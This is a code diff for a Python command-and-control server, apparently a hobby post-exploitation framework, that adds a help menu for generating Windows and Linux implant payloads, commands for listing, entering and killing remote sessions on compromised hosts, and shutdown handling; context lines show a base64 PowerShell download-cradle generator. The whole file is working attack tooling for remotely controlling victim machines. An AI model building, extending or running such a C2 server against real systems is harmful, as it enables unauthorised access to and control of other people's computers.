@@ -15,6 +15,25 @@ import base64
 def banner():
     print("   ___            _ _         ___ ____  _ \n  / _ \__ _  __ _| (_) __ _  / __\___ \(_)\n / /_)/ _` |/ _` | | |/ _` |/ /    __) | |\n/ ___/ (_| | (_| | | | (_| / /___ / __/| |\n\/    \__,_|\__, |_|_|\__,_\____/|_____|_|\n            |___/                         \n")
 
+def help():
+    print("""
+    
+      Menu Commands
+    -------------------------------------------------------------------------
+    listeners -g        ----> Generate new listener.
+    winplant            ----> Generate Windows payload as Python file.
+    linplant            ----> Generate Linux payload as Python file.
+    exeplant            ----> Generate Windows payload as Executable file.
+    sessions -l         ----> List sessions.
+    sessions -i <val>   ----> Enter active session by id.
+    kill <val>          ----> Kill an active session by id.
+
+      Session Commands
+    -------------------------------------------------------------------------
+    background          ----> Backgrounds current session.
+    exit                ----> Ends current session.
+    """)
+
 def winplant():
     ran_name = ("".join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f"{ran_name}.py"
@@ -128,7 +147,7 @@ def comm_out(targ_id, message):
 
 def target_comm(targ_id):
     while True:
-        message = input("@> ")
+        message = input(f"{targets[num][3]}/{targets[num][1]}@> ")
         comm_out(targ_id, message)
         if message == "exit":
             targ_id.send(message.encode())
@@ -235,6 +254,10 @@ def pshell_cradle():
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
     print(f"\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}")
 
+def kill_sig(targ_id, message):
+    message = str(message)
+    targ_id.send(message.encode())
+
 
 
 if __name__ == "__main__":
@@ -247,6 +270,30 @@ if __name__ == "__main__":
     while True:
         try:
             command = input("#> ")
+
+            if command == "help":
+                help()
+            
+            if command == "exit":
+                quit_message = input("Ctrl-C\n[!] Quit? (y/n)").lower()
+            
+                if quit_message == "y":
+                    print("\n[+] Keyboard interrupt issued.")
+                    tar_length = len(targets)
+
+                    for target in targets:
+                        if target[7] == "Dead":
+                            pass
+
+                        else:
+                            comm_out(target[0], "exit")
+
+                            kill_flag = 1
+                            sock.close()
+                            break
+
+                else:
+                    continue
 
             if command == "pshell_shell":
                 pshell_cradle()
@@ -292,6 +339,21 @@ if __name__ == "__main__":
                         session_counter += 1
                     print(myTable)
 
+                if command.split(" ")[0] == "kill":
+                    try:
+                        num = int(command.split(" ")[1])
+                        targ_id = (targets[num])[0]
+                        if (targets[num])[7] == "Active":
+                            kill_sig(targ_id, "exit")
+                            targets[num][7] = "Dead"
+                            print(f"[+] Remote session {num} terminated.")
+    
+                        else:
+                            print(f"[!] Stop hitting it. Remote session {num} is already dead.")
+                        
+                    except (IndexError, ValueError):
+                        print(f"[!] Remote session {num} does not exist.")
+
                 if command.split(" ")[1] == "-i":
                     try:
                         num = int(command.split(" ")[2])
@@ -302,7 +364,7 @@ if __name__ == "__main__":
 
                         else:
                             print("[-] Target session is dead.")
-                    
+
                     except IndexError:
                         print(f"[-] Remote session {num} does not exist.")
         
